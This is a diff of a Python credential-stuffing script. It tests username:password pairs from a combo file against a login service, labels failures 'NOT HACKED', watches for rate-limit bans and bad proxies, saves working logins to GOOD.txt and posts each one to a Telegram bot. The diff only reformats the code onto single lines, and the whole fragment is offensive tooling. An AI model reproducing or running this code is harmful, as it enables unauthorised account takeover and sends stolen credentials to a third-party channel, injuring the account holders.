@@ -72,33 +72,21 @@ def CHECK(user,pess):
 ━━━━━━━━━━━━━"""
 			print("[/] Enjoy")
 			print('--------------------------------'+colorama.Fore.RESET)
-			try:
-				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @TweakPY @vv1ck 💸')
-			except:
-				pass
+			try:requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @TweakPY @vv1ck 💸')
+			except:pass
 			with open('GOOD.txt', 'a') as x:
 				x.write(f'{user}:{pess}' + '\n')
-		elif req.json()['errorCode']=='10000400':
-			print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
+		elif req.json()['errorCode']=='10000400':print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
 		try:
-			if req.json()["errorCode"]=='10000510':
-				print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
-			elif 'Warning: try login too many times.' in req.text:
-				print(colorama.Fore.RED+f"NOT HACKED-Ban coming : [{user}:{pess}]")
-			elif req.json()['errorCode']=='10002058':
-				print(colorama.Fore.RED+f"NOT HACKED-Ban : [{user}:{pess}]")
-			elif req.json()['errorCode']=='10001105':
-				print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
-			elif 'fail to check randomCode.' in req.text:
-				print(colorama.Fore.RED+'Fail Come Back Later')
-			else:
-				print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
-		except:
-			pass
-	except requests.exceptions.ConnectionError:
-		print(colorama.Fore.RED+"[-] Bad Proxy !!"+colorama.Fore.RESET)
-	except KeyboardInterrupt:
-		exit(0)
+			if req.json()["errorCode"]=='10000510':print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
+			elif 'Warning: try login too many times.' in req.text:print(colorama.Fore.RED+f"NOT HACKED-Ban coming : [{user}:{pess}]")
+			elif req.json()['errorCode']=='10002058':print(colorama.Fore.RED+f"NOT HACKED-Ban : [{user}:{pess}]")
+			elif req.json()['errorCode']=='10001105':print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
+			elif 'fail to check randomCode.' in req.text:print(colorama.Fore.RED+'Fail Come Back Later')
+			else:print(colorama.Fore.RED+f"NOT HACKED : [{user}:{pess}]")
+		except:pass
+	except requests.exceptions.ConnectionError:print(colorama.Fore.RED+"[-] Bad Proxy !!"+colorama.Fore.RESET)
+	except KeyboardInterrupt:exit(0)
 def FILname():
 	F=input('[+] Enter The Combo File Name : ')
 	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
